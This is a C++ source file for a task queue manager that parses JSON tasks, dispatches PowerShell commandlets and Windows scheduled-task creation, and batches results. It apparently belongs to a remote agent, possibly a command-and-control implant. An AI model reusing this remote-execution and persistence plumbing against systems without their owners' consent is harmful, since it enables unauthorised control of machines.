#include "TaskQueueManager.h"
#include "rapidjson/stringbuffer.h"
#include "rapidjson/document.h"
#include "rapidjson/writer.h" 
#include "Task.h"

Request TaskQueueManager::ParseTaskRequest(const std::string& rawJson)
{

	rapidjson::Document doc = {};
	doc.Parse(rawJson.c_str());

	int taskID = doc["TaskID"].GetInt();
	int type = doc["TaskType"].GetInt();
	int code = doc["TaskCode"].GetInt();
	int status = doc["Status"].GetInt();
	const rapidjson::Value& node = doc["Command"];
	
	switch (type)
	{
		case POWERSHELL:
		{
			auto cmd = node["Commandlet"].GetString();
			auto arg = node["Arguements"].GetString();
			return CreateTaskRequest<CommandPowershell>(taskID, type, code, status, CommandPowershell{ cmd, arg });
		}
		case WIN_TASK:
		{
			auto path = node["Path"].GetString();
			auto username = node["Username"].GetString();
			auto taskName = node["TaskName"].GetString();
			return CreateTaskRequest<CommandWinTask>(taskID, type, code, status, CommandWinTask{ path, username, taskName });
		}
	}
	TaskRequest<bool> test;
	return test;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
// Default constructor
TaskQueueManager::TaskQueueManager()
{
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
bool TaskQueueManager::HasPendingResult()
{
	return taskResults.size() > 0;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
bool TaskQueueManager::HasPendingTask()
{
	return taskQueue.size() > 0;
}


//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void TaskQueueManager::StoreTaskResult(Response& response)
{
	taskResults.push_back(response);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
std::string TaskQueueManager::GetTaskResults()
{
	std::string json = CreateResponseTaskValue(taskResults);
	taskResults.clear();
	return json;
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
void TaskQueueManager::QueueTask(std::string blob)
{
	if (blob.empty()) return;
	if (blob.length() == 36) return;
	taskQueue.push(blob);
}

//^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^//
Request TaskQueueManager::GetNextTask()
{
	std::string taskBlob = taskQueue.front();
	taskQueue.pop();
	return ParseTaskRequest(taskBlob);
}
